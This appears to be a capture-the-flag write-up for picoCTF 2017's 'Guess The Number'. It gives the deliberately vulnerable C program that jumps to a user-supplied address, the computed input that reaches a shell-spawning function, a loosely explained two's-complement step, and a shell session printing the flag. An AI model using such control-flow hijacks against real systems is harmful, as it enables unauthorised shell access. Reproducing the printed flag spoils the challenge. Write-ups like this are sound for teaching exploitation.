# GuessTheNumber_PicoCTF
Solution to the problem "Guess The Number" in 2017's picoctf.


/* How well do you know your numbers? */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

                                                                      #win() = 0x0804852b
void win(void) { 
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}

int main(int argc, char **argv) {
    uintptr_t val;
    char buf[32] = "";

    /* Turn off buffering so we can see output right away */
    setbuf(stdout, NULL);

    printf("Welcome to the number guessing game!\n");
    printf("I'm thinking of a number. Can you guess it?\n");
    printf("Guess right and you get a shell!\n");

    printf("Enter your number: ");
    scanf("%32s", buf);
    val = strtol(buf, NULL, 10);

    printf("You entered %d. Let's see if it was right...\n", val);

    val >>= 4;                                                        #Shifts our input 4 bits to the right.
    ((void (*)(void))val)();                                          #Turns that value into a memory address and jumps to it.
}
----------------------------------------------------------------------------------------------------------------------------------------

#Shift 0x0804852b 4 bits LEFT to counter the RIGHT shift.
#Int is just over max int size (2,147,483,647) at 2,152,223,408
#strtol allows for negative numbers however. 
#Convert number to binary:    10000000010010000101001010110000
#Invert to get negative:      01111111101101111010110101001111
#Convert that bin back to dec
#2142743887
#Convert to positive
#-2142743887
#Enter and get shell.

$ ls                                                        
flag.txt                                                    
guess_num                                                   
xinetd_wrapper.sh                                           
$ cat flag.txt                                              
957668de6b10f346baef4612a14857e3                            
$     

